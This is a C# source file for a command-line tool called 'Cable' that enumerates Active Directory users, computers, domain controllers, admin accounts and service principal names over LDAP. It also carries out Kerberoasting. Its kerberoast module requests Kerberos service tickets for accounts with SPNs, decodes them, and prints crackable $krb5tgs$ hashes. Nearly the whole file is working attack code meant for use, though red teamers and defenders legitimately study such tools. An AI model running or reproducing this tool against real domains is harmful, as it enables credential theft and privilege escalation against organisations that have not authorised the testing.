using System;
using System.Collections.Generic;
using System.DirectoryServices;
using Asn1;
using System.DirectoryServices.ActiveDirectory;
using System.Security.Principal;

namespace Cable
{
    internal class Program
    {

        static void Help()
        {
            string helptext =

                "Cable.exe [Module] [Options]\n" +
                "Modules:\n" +
                "enum [options] - Enumerate LDAP\n" +
                "\tOptions:\n" +
                "\t-users - Enumerate user objects\n" +
                "\t-computers - Enumerate computer objects\n" +
                "\t-spns - Enumerate objects with servicePrincipalName set\n" +
                "\t-dclist - Enumerate domain controller objects\n" +
                "\t-admins - Enumerate accounts with adminCount set to 1\n" +
                "kerberoast [account] - Kerberoast a potentially supplied account, otherwise roast everything\n";
           
            Console.WriteLine(helptext);
        }

        static SearchResultCollection Query(string query)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);
            ds.Filter = query;

            results = ds.FindAll();
            return results;
        }

        static void dclist()
        {
            Domain domain = Domain.GetCurrentDomain();
            DomainControllerCollection dcs = domain.FindAllDomainControllers();
            foreach (DomainController controller in dcs)
            {
                Console.WriteLine("\n" + controller.Name + "\n===================");
                Console.WriteLine("Forest: " + controller.Forest);
                Console.WriteLine("IP: " + controller.IPAddress);
                Console.WriteLine("Version: " + controller.OSVersion + "\n");
            }
        }

        static void users()
        {
            SearchResultCollection results = Query("(&(ObjectCategory=person)(ObjectClass=user))");

            if (results.Count == 0)
            {
                Console.WriteLine("No users found");
                System.Environment.Exit(0);
            }
            foreach (SearchResult sr in results)
            {
                Console.WriteLine("\nsamAccountName: " + sr.Properties["samaccountname"][0].ToString());
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                Console.WriteLine("objectSid: " + sid.Value);
                Console.WriteLine("distinguishedName: " + sr.Properties["distinguishedname"][0].ToString() + "\n");

            }
        }

        static void spns()
        {

            SearchResultCollection results = Query("(&(serviceprincipalname=*)(!useraccountcontrol:1.2.840.113556.1.4.803:=2))");

            if (results.Count == 0)
            {
                Console.WriteLine("No spns found");
                System.Environment.Exit(0);
            }

            foreach (SearchResult sr in results)
            {
                Console.WriteLine("\nsamAccountName: " + sr.Properties["samaccountname"][0].ToString());
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                Console.WriteLine("objectSid: " + sid.Value);
                Console.WriteLine("distinguishedName: " + sr.Properties["distinguishedname"][0].ToString());
                Console.WriteLine("servicePrincipalName: " + sr.Properties["serviceprincipalname"][0].ToString() + "\n");
            }
        }

        static void admins()
        {
            SearchResultCollection results = Query("(&(admincount=1)(objectClass=user))");
            if (results.Count == 0)
            {
                Console.WriteLine("No admins found");
                System.Environment.Exit(0);
            }
            foreach (SearchResult sr in results)
            {
                Console.WriteLine("\nsamAccountName: " + sr.Properties["samaccountname"][0].ToString());
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                Console.WriteLine("objectSid: " + sid.Value);
                Console.WriteLine("distinguishedName: " + sr.Properties["distinguishedname"][0].ToString());
            }

        }

        static void computers()
        {

            SearchResultCollection results = Query("(ObjectClass=computer)");

            if (results.Count == 0)
            {
                Console.WriteLine("No computers found");
                System.Environment.Exit(0);
            }

            foreach (SearchResult sr in results)
            {
                Console.WriteLine("\nsamAccountName: " + sr.Properties["samaccountname"][0].ToString());
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                Console.WriteLine("objectSid: " + sid.Value);
                Console.WriteLine("distinguishedName: " + sr.Properties["distinguishedname"][0].ToString() + "\n");
            }

        }
        static string[] GetSPNs()
        {
            SearchResultCollection results;
            DirectorySearcher ds = null;

            DirectoryEntry de = new DirectoryEntry();
            ds = new DirectorySearcher(de);
            ds.Filter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";


            Console.WriteLine("[+] Finding Kerberoastable accounts...");
            results = ds.FindAll();

            var spns = new List<string>();
            if (results.Count == 0)
            {
                Console.WriteLine("[-] No Kerberoastable accounts found :(");
                System.Environment.Exit(0);
            }
            foreach (SearchResult sr in results)
            {
                spns.Add(sr.Properties["name"][0].ToString());
            }

            return spns.ToArray();
        }

        static bool Kerberoast(string[] spns)
        {
            string domain = Domain.GetComputerDomain().ToString();

            System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
            for (int i = 0; i < spns.Length; i++)
            {

                long encType = 0;
                string spn = spns[i] + "@" + domain;

                ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                Console.WriteLine("[+] Requesting ticket...");
                byte[] requestBytes = ticket.GetRequest();

                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                Console.WriteLine("[+] Decoding...");
                AsnElt apRep = AsnElt.Decode(apReqBytes);
                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {

                                            int checksumStart = cipherText.Length - 24;

                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }

                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }

                                        Console.WriteLine("[+] Got Hash!\n" + hash);
                                    }
                                }
                            }
                        }
                    }

                }
            }

            return true;
        }

        static void Main(string[] args)
        {

            try
            {
                if (args.Length > 0)
                {
                    if (args[0] == "kerberoast")
                    {
                        string[] spns = GetSPNs();
                        Kerberoast(spns);

                    }

                    else if (args[0] == "enum")
                    {
                        if (args.Length > 1)
                        {
                            switch (args[1])
                            {
                                case "-users":
                                    users();
                                    break;
                                case "-computers":
                                    computers();
                                    break;
                                case "-dclist":
                                    dclist();
                                    break;
                                case "-spns":
                                    spns();
                                    break;
                                case "-admins":
                                    admins();
                                    break;
                                default:
                                    Help();
                                    break;

                            }
                        }
                        else
                        {
                            Help();
                        }
                    }

                    else
                    {
                        Help();
                    }
                }
                else
                {
                    Help();
                }
            }
            catch (Exception e) 
            {
                Console.WriteLine("[-] Exception: " + e.ToString());
            }

        }
    }
}
